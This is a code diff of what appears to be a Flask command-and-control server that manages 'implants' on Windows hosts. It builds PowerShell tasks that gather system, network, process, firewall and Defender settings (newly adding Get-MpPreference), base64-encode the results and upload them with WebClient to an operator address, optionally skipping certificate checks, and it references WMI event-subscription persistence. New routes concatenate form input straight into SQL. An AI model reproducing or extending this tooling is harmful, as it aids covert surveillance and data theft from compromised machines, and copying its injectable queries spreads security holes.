@@ -29,7 +29,7 @@ def surveyGen():
         port=request.form['port']
 #       key='0000'                      #We will get the key later
         notes=request.form['notes']
-        ssl, systeminfo, netstat, ps, svc, dir, dir_c, dir_windows, dir_system32, dir_programfiles, dir_x86, netsh, firewall, firewall_rules = (False,)*14
+        mp_pref, ssl, systeminfo, netstat, ps, svc, dir, dir_c, dir_windows, dir_system32, dir_programfiles, dir_x86, netsh, firewall, firewall_rules = (False,)*15
         if "ssl" in request.form:
             ssl=True
         if "systeminfo" in request.form:
@@ -54,6 +54,8 @@ def surveyGen():
             netsh=True
         if "firewall" in request.form:
             firewall=True
+        if "mp_pref" in request.form:
+            mp_pref=True
         if "firewall_rules" in request.form:     #this returns to many resuts for the return and isn't implemented below
             firewall_rules=True
         
@@ -89,6 +91,8 @@ def surveyGen():
         if firewall:
             task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
             task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
+        if mp_pref:
+            task = task+"$message+= (get-mppreference) | Out-String\n"
 #        if firewall_rules:
 #            task = task+"$message+= (get-netfirewallrule -all) | Out-String\n"
         
@@ -96,7 +100,6 @@ def surveyGen():
         task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n"
         if ssl:
             task=task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
-            print(task)
         else:
             task=task+"(New-Object Net.Webclient).UploadString('http://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
             print(task)
@@ -154,11 +157,47 @@ def getData():
         return render_template('getData.html',error=error,dataDetails=dataDetails)
 
     cur = mysql.connection.cursor()
-    cur.execute("SELECT id,UUID,delivered,details from datastore order by delivered desc")
+    cur.execute("SELECT id,UUID,delivered,details from datastore order by delivered desc limit 100")
     dataDetails=cur.fetchall()
     cur.close()
     return render_template('showData.html',error=error,dataDetails=dataDetails) 
-    
+
+@app.route('/updatenotes',methods=['POST'])
+def updatenotes():
+    error = None
+    if request.method == "POST":
+        UUID = request.form['UUID']
+        notes = request.form['notes']
+        try:
+           cur = mysql.connection.cursor()
+           cur.execute("update implants set notes='"+ notes + "' where (UUID='" + UUID + "')")
+           mysql.connection.commit()
+           flash("Notes Updated")
+           return redirect(url_for('implants'))
+        except:
+            return redirect(url_for('implants'))
+
+@app.route('/deleteImplant', methods=['POST'])
+def deleteImplant():
+    error = None
+    if request.method == "POST":
+        UUID1 = request.form['UUID1']
+        UUID2 = request.form['UUID2']
+        if UUID2==UUID1:
+            cur = mysql.connection.cursor()
+            cur.execute("delete from implants where UUID='" + UUID1 + "'")
+            mysql.connection.commit()
+            flash("Implant " + UUID1 + " deleted from database")
+            return redirect(url_for('implants'))
+        else:
+            flash("UUID does not match.")
+            flash("Implant not deleted.")
+            return redirect(url_for('implants'))
+
+
+
+
+
 
 @app.route('/tasks',methods=['GET','POST'])
 def tasks():
@@ -197,7 +236,8 @@ def implants():
         return render_template('singleimplant.html',implantDetails=implantDetails,singleImplant=singleImplant,error=error)
 
     cur = mysql.connection.cursor()
-    implants = cur.execute("select t.UUID, t.last_checkin, t.gateway,t.id from checkins as t Inner join ( select UUID, max(last_checkin) as MaxDate from checkins group by UUID ) tm on t.UUID = tm.UUID and t.last_checkin = tm.MaxDate;")
+#    implants = cur.execute("select t.UUID, t.last_checkin, t.gateway,t.id from checkins as t Inner join ( select UUID, max(last_checkin) as MaxDate from checkins group by UUID ) tm on t.UUID = tm.UUID and t.last_checkin = tm.MaxDate;")    ##this will grab implants, latest gateway, and latest checking.  I dno't think I want this, but i'm leaving it in case
+    implants = cur.execute("select * from implants")
     implantDetails = cur.fetchall()
     return render_template('implants.html',implantDetails=implantDetails,error=error)
 
@@ -225,8 +265,8 @@ def addimplant():
 
     return render_template('addimplant.html',error=error)
 
-@app.route('/updateimplant',methods=['GET','POST'])
-def updateimplant():
+@app.route('/generateinstall',methods=['GET','POST'])
+def generateinstall():
     error=None
     
     if request.method == 'POST':
@@ -306,12 +346,12 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
             flash('Filter: '+ filter)   #It's been added
             flash('Consumer: '+ consumer)   #It's been added
             flash('Invterval: '+ str(interval))   #It's been added
-            return render_template('updateimplant.html',data=data,remove_data=remove_data)
+            return render_template('generateinstall.html',data=data,remove_data=remove_data)
         except:
             error = "An error has occured."
-            return render_template('updateimplant.html',error=error,data=data,remove_data=remove_data)
+            return render_template('generateinstall.html',error=error,data=data,remove_data=remove_data)
 
-    return render_template('updateimplant.html',error=error)
+    return render_template('generateinstall.html',error=error)
 
 
 if __name__ == "__main__":
